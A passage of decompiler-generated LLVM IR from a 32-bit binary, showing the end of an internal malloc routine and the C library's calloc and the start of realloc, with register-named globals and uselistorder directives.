  br label %dec_label_pc_805264f

dec_label_pc_805264f:                             ; preds = %dec_label_pc_805263d, %dec_label_pc_805264d
  %v0_805266b71 = phi i32 [ %v0_8052644, %dec_label_pc_805263d ], [ %v0_8052648106, %dec_label_pc_805264d ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805266b

dec_label_pc_8052653:                             ; preds = %dec_label_pc_8052648
  store i32 0, i32* %stack_var_-72, align 4
  %v1_8052655 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052655, i32* %edx.global-to-local, align 4
  %v1_805265c = load i32, i32* @ebx, align 4
  %v2_805265c = sub i32 %v1_8052655, %v1_805265c
  %v1_805265e = load i32, i32* @edi, align 4
  %v2_805265e = sub i32 %v2_805265c, %v1_805265e
  store i32 %v2_805265e, i32* %eax.global-to-local, align 4
  store i32 %v1_805265c, i32* @ebp, align 4
  %v0_8052662 = load i32, i32* @global_var_805ade8.296, align 8
  %v2_8052662 = add i32 %v0_8052662, %v2_805265e
  store i32 %v2_8052662, i32* @global_var_805ade8.296, align 8
  br label %dec_label_pc_8052668

dec_label_pc_8052668:                             ; preds = %dec_label_pc_805262c, %dec_label_pc_8052653
  %v0_805266b70 = phi i32 [ %v1_805262e, %dec_label_pc_805262c ], [ %v1_8052655, %dec_label_pc_8052653 ]
  store i32 0, i32* @esi, align 4
  %v2_805266a = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_805266a, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805266b

dec_label_pc_805266b:                             ; preds = %dec_label_pc_8052637, %dec_label_pc_805264f, %dec_label_pc_8052668
  %v0_8052670 = phi i32 [ %v1_8052621, %dec_label_pc_8052637 ], [ %v0_805266b71, %dec_label_pc_805264f ], [ %v0_805266b70, %dec_label_pc_8052668 ]
  %v10_805266b = icmp eq i32 %v0_8052670, -1
  br i1 %v10_805266b, label %dec_label_pc_80526dd, label %dec_label_pc_8052670

dec_label_pc_8052670:                             ; preds = %dec_label_pc_805266b
  %v1_8052670 = load i32, i32* @esi, align 4
  %v2_8052670 = add i32 %v1_8052670, %v0_8052670
  %v0_8052673 = load i32, i32* @ebp, align 4
  store i32 %v0_8052673, i32* @global_var_805aaac.283, align 4
  %v2_8052679 = sub i32 %v2_8052670, %v0_8052673
  %v1_805267b = or i32 %v2_8052679, 1
  store i32 %v1_805267b, i32* %eax.global-to-local, align 4
  %v2_805267e = add i32 %v0_8052673, 4
  %v3_805267e = inttoptr i32 %v2_805267e to i32*
  store i32 %v1_805267b, i32* %v3_805267e, align 4
  %v0_8052681 = load i32, i32* @global_var_805ade8.296, align 8
  %v1_8052681 = load i32, i32* @esi, align 4
  %v2_8052681 = add i32 %v1_8052681, %v0_8052681
  store i32 %v2_8052681, i32* @global_var_805ade8.296, align 8
  br i1 %v2_80524e2, label %dec_label_pc_80526dd, label %dec_label_pc_805268e

dec_label_pc_805268e:                             ; preds = %dec_label_pc_8052670
  store i32 %v0_80524d5, i32* %ebx.global-to-local, align 4
  %v1_8052696 = add i32 %v1_80524e2, -12
  %v1_8052699 = and i32 %v1_8052696, -8
  store i32 %v1_8052699, i32* %eax.global-to-local, align 4
  %v1_805269e = or i32 %v1_8052699, 1
  store i32 %v1_805269e, i32* %edx.global-to-local, align 4
  %v5_80526a1 = icmp ult i32 %v1_8052699, 15
  store i32 %v1_805269e, i32* %v2_80524df, align 4
  %v0_80526a7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80526a7 = load i32, i32* %eax.global-to-local, align 4
  %v2_80526a7 = add i32 %v0_80526a7, 4
  %v3_80526a7 = add i32 %v2_80526a7, %v1_80526a7
  %v4_80526a7 = inttoptr i32 %v3_80526a7 to i32*
  store i32 5, i32* %v4_80526a7, align 4
  %v0_80526af = load i32, i32* %eax.global-to-local, align 4
  %v1_80526af = load i32, i32* %ebx.global-to-local, align 4
  %v2_80526af = add i32 %v0_80526af, 8
  %v3_80526af = add i32 %v2_80526af, %v1_80526af
  %v4_80526af = inttoptr i32 %v3_80526af to i32*
  store i32 5, i32* %v4_80526af, align 4
  br i1 %v5_80526a1, label %dec_label_pc_80526dd, label %dec_label_pc_80526b9

dec_label_pc_80526b9:                             ; preds = %dec_label_pc_805268e
  %v0_80526bd = load i32, i32* @global_var_805adc4.300, align 4
  store i32 %v0_80526bd, i32* @ebx, align 4
  %v1_80526c3 = add i32 %v0_80524d5, 8
  store i32 %v1_80526c3, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @global_var_805adc4.300, align 4
  store i32 %v1_80526c3, i32* %stack_var_-72, align 4
  %v1_80526d1 = call i32 @free(i32 %v1_80526c3)
  store i32 %v1_80526d1, i32* %eax.global-to-local, align 4
  %v0_80526d6 = load i32, i32* @ebx, align 4
  store i32 %v0_80526d6, i32* @global_var_805adc4.300, align 4
  store i32 %v1_80526c3, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80526dd

dec_label_pc_80526dd:                             ; preds = %dec_label_pc_805268e, %dec_label_pc_8052670, %dec_label_pc_805266b, %dec_label_pc_80525a3, %dec_label_pc_80526b9
  %v0_80526dd = load i32, i32* @global_var_805ade8.296, align 8
  store i32 %v0_80526dd, i32* %eax.global-to-local, align 4
  %v1_80526e2 = load i32, i32* @global_var_805adec.301, align 4
  %tmp154 = icmp ugt i32 %v0_80526dd, %v1_80526e2
  br i1 %tmp154, label %dec_label_pc_80526ea, label %dec_label_pc_80526ef

dec_label_pc_80526ea:                             ; preds = %dec_label_pc_80526dd
  store i32 %v0_80526dd, i32* @global_var_805adec.301, align 4
  br label %dec_label_pc_80526ef

dec_label_pc_80526ef:                             ; preds = %dec_label_pc_80526dd, %dec_label_pc_80526ea
  %v1_80526ef = load i32, i32* @global_var_805ade4.294, align 4
  %v2_80526ef = add i32 %v1_80526ef, %v0_80526dd
  store i32 %v2_80526ef, i32* %eax.global-to-local, align 4
  %v1_80526f5 = load i32, i32* @global_var_805adf4.297, align 4
  %tmp155 = icmp ugt i32 %v2_80526ef, %v1_80526f5
  br i1 %tmp155, label %dec_label_pc_80526fd, label %dec_label_pc_8052702

dec_label_pc_80526fd:                             ; preds = %dec_label_pc_80526ef
  store i32 %v2_80526ef, i32* @global_var_805adf4.297, align 4
  br label %dec_label_pc_8052702

dec_label_pc_8052702:                             ; preds = %dec_label_pc_80526ef, %dec_label_pc_80526fd
  %v0_8052702 = load i32, i32* @global_var_805aaac.283, align 4
  store i32 %v0_8052702, i32* %ebx.global-to-local, align 4
  %v1_8052708 = add i32 %v0_8052702, 4
  %v2_8052708 = inttoptr i32 %v1_8052708 to i32*
  %v3_8052708 = load i32, i32* %v2_8052708, align 4
  %v1_805270b = and i32 %v3_8052708, -4
  store i32 %v1_805270b, i32* @ecx, align 4
  %v10_805270e = icmp ult i32 %v1_805270b, %v1_80523a7
  br i1 %v10_805270e, label %dec_label_pc_8052736, label %dec_label_pc_8052714

dec_label_pc_8052714:                             ; preds = %dec_label_pc_8052702
  %v5_8052718 = sub i32 %v1_805270b, %v1_8052434
  store i32 %v5_8052718, i32* %ecx.global-to-local, align 4
  %v2_805271c = add i32 %v0_8052702, %v1_8052434
  store i32 %v2_805271c, i32* %edx.global-to-local, align 4
  %v1_805271f = or i32 %v1_8052434, 1
  store i32 %v1_805271f, i32* %v2_8052708, align 4
  %v0_8052725 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052725 = or i32 %v0_8052725, 1
  store i32 %v1_8052725, i32* @ecx, align 4
  %v0_8052728 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052728 = add i32 %v0_8052728, 8
  store i32 %v1_8052728, i32* %eax.global-to-local, align 4
  %v0_805272b = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805272b, i32* @global_var_805aaac.283, align 4
  %v2_8052731 = add i32 %v0_805272b, 4
  %v3_8052731 = inttoptr i32 %v2_8052731 to i32*
  store i32 %v1_8052725, i32* %v3_8052731, align 4
  %v0_8052744.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052744

dec_label_pc_8052736:                             ; preds = %dec_label_pc_8052583.thread107, %dec_label_pc_8052550, %dec_label_pc_8052702
  store i32 12, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052744

dec_label_pc_8052744:                             ; preds = %dec_label_pc_8052714, %dec_label_pc_80524cd, %dec_label_pc_80523ec, %dec_label_pc_8052736
  %v0_8052744 = phi i32 [ %v0_8052744.pre, %dec_label_pc_8052714 ], [ %v1_80524cd, %dec_label_pc_80524cd ], [ %v1_80523fe, %dec_label_pc_80523ec ], [ 0, %dec_label_pc_8052736 ]
  store i32 %v0_8052744, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052746

dec_label_pc_8052746:                             ; preds = %dec_label_pc_80523d5, %dec_label_pc_80522b1, %dec_label_pc_80520ad, %dec_label_pc_8052744
  store i32 1, i32* %stack_var_-72, align 4
  store i32 %v2_8051feb, i32* %eax.global-to-local, align 4
  %v3_805274d = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v2_8051feb, i32* %eax.global-to-local, align 4
  store i32 1, i32* @edx, align 4
  %v2_8052759.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8052754

dec_label_pc_8052754:                             ; preds = %dec_label_pc_8052007, %dec_label_pc_8052746
  %v2_8052759 = phi i32 [ %v0_8051fd9, %dec_label_pc_8052007 ], [ %v2_8052759.pre, %dec_label_pc_8052746 ]
  %v0_8052757 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052757, i32* %eax.global-to-local, align 4
  store i32 %v2_8052759, i32* @ebx, align 4
  store i32 %v0_8051fd8, i32* @esi, align 4
  store i32 %v0_8051fd7, i32* @edi, align 4
  store i32 %v0_8051fd6, i32* @ebp, align 4
  ret i32 %v0_8052757

; uselistorder directives
  uselistorder i32 %v2_80526ef, { 1, 0, 2 }
  uselistorder i32 %v0_80526dd, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8052673, { 1, 0, 2 }
  uselistorder i32 %v2_805265e, { 1, 0 }
  uselistorder i32 %v1_8052621, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_805261d, { 0, 3, 2, 1 }
  uselistorder i32 %v2_805260a, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8052601, { 1, 0, 2 }
  uselistorder i32 %v1_80525f1, { 2, 1, 0 }
  uselistorder i8 %v0_80525b9, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v5_8052596, { 1, 0, 2 }
  uselistorder i32 %v0_805264d105, { 3, 1, 2, 4, 0, 6, 5 }
  uselistorder i32 %v0_8052648106, { 2, 0, 1 }
  uselistorder i32 %v1_8052590, { 2, 1, 0 }
  uselistorder i32 %v6_8052565, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8052562, { 1, 0 }
  uselistorder i32 %v0_8052543, { 1, 0 }
  uselistorder i32 %v2_8052515, { 0, 2, 1, 3, 4, 5 }
  uselistorder i8 %v0_80524f5, { 1, 0 }
  uselistorder i1 %v2_80524e2, { 2, 1, 0 }
  uselistorder i32 %v1_80524e2, { 7, 0, 6, 1, 5, 2, 3, 4, 8 }
  uselistorder i32 %v0_80524d5, { 4, 3, 5, 0, 2, 1 }
  uselistorder i32 %v2_80524ba, { 1, 0, 2 }
  uselistorder i32 %v2_80524a2, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_805246c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8052462, { 2, 1, 0 }
  uselistorder i32 %v6_8052451, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32 %v2_805243a, { 1, 0, 2 }
  uselistorder i32 %v0_80523dd, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_80523a7, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805239d, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_805238a, { 1, 0 }
  uselistorder i32 %v1_8052322, { 1, 0 }
  uselistorder i32 %v3_8052316, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8052326, { 1, 0 }
  uselistorder i32 %v2_8052310, { 2, 1, 0 }
  uselistorder i32 %edi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_805230d13, { 1, 0 }
  uselistorder i32 %v2_8052302, { 1, 0 }
  uselistorder i32 %v1_80522e6, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_80522e2, { 2, 1, 0 }
  uselistorder i32 %v1_80522de, { 1, 0 }
  uselistorder i32 %v1_80522d2, { 2, 1, 0 }
  uselistorder i32 %v2_80522c8, { 1, 0 }
  uselistorder i32 %v1_80522be, { 1, 2, 0 }
  uselistorder i32 %v4_8052256, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_80522ae, { 1, 0 }
  uselistorder i32 %v3_8052242, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805220f15, { 2, 1, 0 }
  uselistorder i32 %v1_8052208, { 1, 0 }
  uselistorder i32 %v2_80521dc, { 1, 0 }
  uselistorder i32 %v1_80521d9, { 2, 1, 0 }
  uselistorder i32 %v3_80521c9, { 0, 2, 3, 1 }
  uselistorder i32 %v1_80521c4, { 1, 0, 2 }
  uselistorder i32 %v2_805219e, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v2_8052183, { 1, 0 }
  uselistorder i32 %v0_8052179, { 1, 0, 2 }
  uselistorder i32 %v0_805214c, { 1, 0 }
  uselistorder i32 %v5_805210c, { 1, 0, 2 }
  uselistorder i32 %v1_80520e3, { 1, 0, 2, 3 }
  uselistorder i32 %v3_80520e0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_80520f8, { 8, 9, 1, 0, 3, 2, 4, 5, 6, 7 }
  uselistorder i32 %v3_8052090, { 1, 0, 2 }
  uselistorder i32 %v2_8052086, { 1, 0 }
  uselistorder i32 %v2_805205e, { 1, 0 }
  uselistorder i8 %v0_8052031, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_8052434, { 12, 2, 20, 11, 10, 3, 22, 21, 19, 13, 4, 18, 23, 24, 5, 25, 26, 6, 15, 16, 17, 30, 7, 29, 9, 27, 28, 8, 31, 14, 0, 33, 32, 1, 34 }
  uselistorder i32 %v1_805201a, { 0, 2, 1 }
  uselistorder i32 %v0_8052002, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 2, 3, 0, 16, 17, 15, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 50, 48, 49, 51 }
  uselistorder i32* %ebx.global-to-local, { 37, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 17, 14, 0, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 31, 32, 27, 28, 29, 30, 33, 38, 39, 40, 34, 35, 36 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 53, 48, 49, 51, 52, 50, 54, 55, 56, 57, 58, 59, 60, 61, 62, 67, 71, 68, 69, 70, 72, 73, 74, 75, 76, 77, 78, 0, 63, 66, 64, 65 }
  uselistorder i8* @global_var_805ade0.299, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134589108, { 2, 0, 3, 1 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805aaac.283 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805aaac.283 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8052754, { 1, 0 }
  uselistorder label %dec_label_pc_8052746, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052744, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052736, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052702, { 1, 0 }
  uselistorder label %dec_label_pc_80526ef, { 1, 0 }
  uselistorder label %dec_label_pc_80526dd, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805266b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052668, { 1, 0 }
  uselistorder label %dec_label_pc_805264f, { 1, 0 }
  uselistorder label %dec_label_pc_8052606, { 1, 0 }
  uselistorder label %dec_label_pc_80525ef, { 1, 0 }
  uselistorder label %dec_label_pc_80525d5, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052550, { 1, 0 }
  uselistorder label %dec_label_pc_8052543, { 1, 0 }
  uselistorder label %dec_label_pc_8052504, { 1, 0 }
  uselistorder label %dec_label_pc_80524d5, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80524cd, { 1, 0 }
  uselistorder label %dec_label_pc_80524ba, { 1, 0 }
  uselistorder label %dec_label_pc_80524a0, { 1, 0 }
  uselistorder label %dec_label_pc_8052482, { 1, 0 }
  uselistorder label %dec_label_pc_80523d5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805239d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052381, { 1, 0 }
  uselistorder label %dec_label_pc_805230d, { 1, 0 }
  uselistorder label %dec_label_pc_8052312.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80522e6, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80522be, { 1, 0 }
  uselistorder label %dec_label_pc_80522b1, { 1, 0 }
  uselistorder label %dec_label_pc_8052260, { 1, 0 }
  uselistorder label %dec_label_pc_8052225, { 1, 0 }
  uselistorder label %dec_label_pc_8052204, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805220f, { 1, 0 }
  uselistorder label %dec_label_pc_80521d7, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_80521c9, { 1, 0 }
  uselistorder label %dec_label_pc_80520ad, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8052031, { 1, 0 }
}

define i32 @calloc(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8052760 = load i32, i32* @edi, align 4
  %v0_8052762 = load i32, i32* @ebx, align 4
  %v12_8052763 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @ecx, align 4
  %v4_805276a = trunc i64 %arg1 to i32
  %v3_8052770 = sext i32 %arg2 to i64
  %v5_8052770 = mul nsw i64 %v3_8052770, %arg1
  %v6_8052770 = trunc i64 %v5_8052770 to i32
  store i32 %v6_8052770, i32* @ebx, align 4
  %v2_8052773 = icmp eq i32 %v4_805276a, 0
  br i1 %v2_8052773, label %dec_label_pc_8052796, label %dec_label_pc_8052777

dec_label_pc_8052777:                             ; preds = %entry
  store i32 %v4_805276a, i32* @edi, align 4
  %div = udiv i32 %v6_8052770, %v4_805276a
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp17 = urem i32 %v6_8052770, %v4_805276a
  store i32 %tmp17, i32* @edx, align 4
  %v12_805277f = icmp eq i32 %div, %arg2
  br i1 %v12_805277f, label %dec_label_pc_8052796, label %dec_label_pc_8052783

dec_label_pc_8052783:                             ; preds = %dec_label_pc_8052777
  store i32 -8, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 12, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8052843

dec_label_pc_8052796:                             ; preds = %dec_label_pc_8052777, %entry
  store i32 %v12_8052763, i32* %eax.global-to-local, align 4
  %v4_80527a5 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134559876, i32 ptrtoint (i32* @global_var_8057ba8.280 to i32))
  store i32 %v4_80527a5, i32* %eax.global-to-local, align 4
  %v1_80527af = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8057ba8.280 to i32))
  store i32 %v1_80527af, i32* %eax.global-to-local, align 4
  %v0_80527b4 = load i32, i32* @ebx, align 4
  %v1_80527b5 = call i32 @malloc(i32 %v0_80527b4)
  store i32 %v1_80527b5, i32* %eax.global-to-local, align 4
  store i32 %v1_80527b5, i32* %ebx.global-to-local, align 4
  %v1_80527bf = icmp eq i32 %v1_80527b5, 0
  br i1 %v1_80527bf, label %dec_label_pc_8052835, label %dec_label_pc_80527c3

dec_label_pc_80527c3:                             ; preds = %dec_label_pc_8052796
  %v1_80527c3 = add i32 %v1_80527b5, -4
  %v2_80527c3 = inttoptr i32 %v1_80527c3 to i32*
  %v3_80527c3 = load i32, i32* %v2_80527c3, align 4
  store i32 %v3_80527c3, i32* %eax.global-to-local, align 4
  %v2_80527c6 = and i32 %v3_80527c3, 2
  %v3_80527c6 = icmp eq i32 %v2_80527c6, 0
  %v1_80527c8 = icmp eq i1 %v3_80527c6, false
  br i1 %v1_80527c8, label %dec_label_pc_8052835, label %dec_label_pc_80527ca

dec_label_pc_80527ca:                             ; preds = %dec_label_pc_80527c3
  %v1_80527ca5 = add i32 %v3_80527c3, -4
  %v1_80527cd = and i32 %v1_80527ca5, -4
  %v2_80527d2 = udiv i32 %v1_80527cd, 4
  store i32 %v2_80527d2, i32* %eax.global-to-local, align 4
  %v5_80527d5 = icmp ult i32 %v1_80527cd, 36
  %tmp = and i32 %v1_80527ca5, -4
  %tmp20 = icmp eq i32 %tmp, 36
  %v2_80527d8 = or i1 %v5_80527d5, %tmp20
  br i1 %v2_80527d8, label %dec_label_pc_80527e8, label %dec_label_pc_80527da

dec_label_pc_80527da:                             ; preds = %dec_label_pc_80527ca
  %v3_80527de = inttoptr i32 %v1_80527b5 to i8*
  %v4_80527de = call i32 @__GI_memset(i8* %v3_80527de, i32 0, i32 %v1_80527cd)
  store i32 %v4_80527de, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052835

dec_label_pc_80527e8:                             ; preds = %dec_label_pc_80527ca
  %v1_80527e8 = inttoptr i32 %v1_80527b5 to i32*
  store i32 0, i32* %v1_80527e8, align 4
  %v0_80527ee = load i32, i32* %ebx.global-to-local, align 4
  %v1_80527ee = add i32 %v0_80527ee, 4
  %v2_80527ee = inttoptr i32 %v1_80527ee to i32*
  store i32 0, i32* %v2_80527ee, align 4
  %v0_80527f5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80527f5 = add i32 %v0_80527f5, 8
  %v2_80527f5 = inttoptr i32 %v1_80527f5 to i32*
  store i32 0, i32* %v2_80527f5, align 4
  %v0_80527fc = load i32, i32* %eax.global-to-local, align 4
  %tmp18 = icmp ult i32 %v0_80527fc, 5
  br i1 %tmp18, label %dec_label_pc_8052835, label %dec_label_pc_8052801

dec_label_pc_8052801:                             ; preds = %dec_label_pc_80527e8
  %v0_8052801 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052801 = add i32 %v0_8052801, 12
  %v2_8052801 = inttoptr i32 %v1_8052801 to i32*
  store i32 0, i32* %v2_8052801, align 4
  %v0_8052808 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052808 = add i32 %v0_8052808, 16
  %v2_8052808 = inttoptr i32 %v1_8052808 to i32*
  store i32 0, i32* %v2_8052808, align 4
  %v0_805280f = load i32, i32* %eax.global-to-local, align 4
  %tmp19 = icmp ult i32 %v0_805280f, 7
  br i1 %tmp19, label %dec_label_pc_8052835, label %dec_label_pc_8052814

dec_label_pc_8052814:                             ; preds = %dec_label_pc_8052801
  %v0_8052814 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052814 = add i32 %v0_8052814, 20
  %v2_8052814 = inttoptr i32 %v1_8052814 to i32*
  store i32 0, i32* %v2_8052814, align 4
  %v0_805281b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805281b = add i32 %v0_805281b, 24
  %v2_805281b = inttoptr i32 %v1_805281b to i32*
  store i32 0, i32* %v2_805281b, align 4
  %v0_8052822 = load i32, i32* %eax.global-to-local, align 4
  %v9_8052822 = icmp eq i32 %v0_8052822, 9
  %v1_8052825 = icmp eq i1 %v9_8052822, false
  br i1 %v1_8052825, label %dec_label_pc_8052835, label %dec_label_pc_8052827

dec_label_pc_8052827:                             ; preds = %dec_label_pc_8052814
  %v0_8052827 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052827 = add i32 %v0_8052827, 28
  %v2_8052827 = inttoptr i32 %v1_8052827 to i32*
  store i32 0, i32* %v2_8052827, align 4
  %v0_805282e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805282e = add i32 %v0_805282e, 32
  %v2_805282e = inttoptr i32 %v1_805282e to i32*
  store i32 0, i32* %v2_805282e, align 4
  br label %dec_label_pc_8052835

dec_label_pc_8052835:                             ; preds = %dec_label_pc_8052814, %dec_label_pc_8052801, %dec_label_pc_80527e8, %dec_label_pc_80527c3, %dec_label_pc_8052796, %dec_label_pc_80527da, %dec_label_pc_8052827
  store i32 %v12_8052763, i32* %eax.global-to-local, align 4
  %v3_805283c = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  store i32 %v12_8052763, i32* %eax.global-to-local, align 4
  store i32 1, i32* @edx, align 4
  br label %dec_label_pc_8052843

dec_label_pc_8052843:                             ; preds = %dec_label_pc_8052783, %dec_label_pc_8052835
  %v0_8052846 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052846, i32* %eax.global-to-local, align 4
  store i32 %v0_8052762, i32* @ebx, align 4
  store i32 %v0_8052760, i32* @edi, align 4
  ret i32 %v0_8052846

; uselistorder directives
  uselistorder i32 %v1_80527cd, { 2, 1, 0 }
  uselistorder i32 %v1_80527b5, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v6_8052770, { 1, 0, 2 }
  uselistorder i32 %v4_805276a, { 1, 0, 2, 3 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 1, 2, 3, 4, 7, 5, 6, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 5, 6, 3, 7, 8, 9, 12, 10, 11, 14, 13 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052843, { 1, 0 }
  uselistorder label %dec_label_pc_8052835, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_805284c = load i32, i32* @ebp, align 4
  %v0_805284d = load i32, i32* @edi, align 4
  %v0_805284e = load i32, i32* @esi, align 4
  %v0_805284f = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_8052857 = icmp eq i32* %arg1, null
  %v1_805285c = icmp eq i1 %v4_8052857, false
  br i1 %v1_805285c, label %dec_label_pc_8052868, label %dec_label_pc_805285e

dec_label_pc_805285e:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-48, align 4
  %v1_805285f = call i32 @malloc(i32 %arg2)
  store i32 %v1_805285f, i32* %eax.global-to-local, align 4
  store i32 %v1_805285f, i32* @ebx, align 4
  br label %dec_label_pc_8052875

dec_label_pc_8052868:                             ; preds = %entry
  %v1_8052868 = icmp eq i32 %arg2, 0
  %v1_805286a = icmp eq i1 %v1_8052868, false
  br i1 %v1_805286a, label %dec_label_pc_805287b, label %dec_label_pc_805286c

dec_label_pc_805286c:                             ; preds = %dec_label_pc_8052868
  store i32 %tmp7, i32* %stack_var_-48, align 4
  %v1_8052870 = call i32 @free(i32 %tmp7)
  store i32 %v1_8052870, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052875

dec_label_pc_8052875:                             ; preds = %dec_label_pc_805285e, %dec_label_pc_805286c
  %v2_8052875 = load i32, i32* %stack_var_-48, align 4
  store i32 %v2_8052875, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052b3d

dec_label_pc_805287b:                             ; preds = %dec_label_pc_8052868
  store i32 ptrtoint (i32* @global_var_8057ba8.280 to i32), i32* %stack_var_-48, align 4
  %v2_8052885 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052885, i32* %eax.global-to-local, align 4
  %v4_805288a = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134559876, i32 ptrtoint (i32* @global_var_8057ba8.280 to i32))
  store i32 %v4_805288a, i32* %eax.global-to-local, align 4
  %v1_8052894 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8057ba8.280 to i32))
  store i32 %v1_8052894, i32* %eax.global-to-local, align 4
  %v0_805289c = load i32, i32* @ebx, align 4
  %tmp20 = icmp ult i32 %v0_805289c, -32
  br i1 %tmp20, label %dec_label_pc_80528b4, label %dec_label_pc_80528a1

dec_label_pc_80528a1:                             ; preds = %dec_label_pc_805287b
  store i32 -8, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8052b3d

dec_label_pc_80528b4:                             ; preds = %dec_label_pc_805287b
  %v1_80528b4 = add i32 %v0_805289c, 11
  %tmp21 = icmp ult i32 %v1_80528b4, 16
